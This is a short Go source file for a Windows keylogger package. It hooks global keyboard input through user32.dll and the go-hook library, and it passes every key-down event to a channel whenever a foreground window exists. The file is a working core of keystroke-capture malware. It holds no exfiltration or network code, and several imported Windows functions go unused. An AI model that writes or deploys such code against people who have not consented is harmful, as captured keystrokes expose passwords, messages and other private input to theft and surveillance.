package keylogger

import (
	"fmt"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
	"os"
	"os/signal"
)

var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetKeyState       = mod.NewProc("GetKeyState")
	procGetKeyboardLayout = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState  = mod.NewProc("GetKeyboardState")
	procToUnicodeEx       = mod.NewProc("ToUnicodeEx")
)

// GetForegroundWindow gets current foreground window
func GetForegroundWindow() uintptr {
	proc := mod.NewProc("GetForegroundWindow")
	hwnd, _, _ := proc.Call()
	return hwnd
}

// KeyLogger runs the keylogger
func KeyLogger(keyOut chan types.KeyboardEvent) error {
	// Buffer size is depends on your need. The 100 is placeholder value.
	keyboardChan := make(chan types.KeyboardEvent, 100)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("Start capturing keyboard input")

	for {
		select {
		case <-signalChan:
			fmt.Println("Received shutdown signal")
			return nil
		case k := <-keyboardChan:
			if hwnd := GetForegroundWindow(); hwnd != 0 {
				if k.Message == types.WM_KEYDOWN {
					keyOut <- k
				}
			}
		}
	}
}
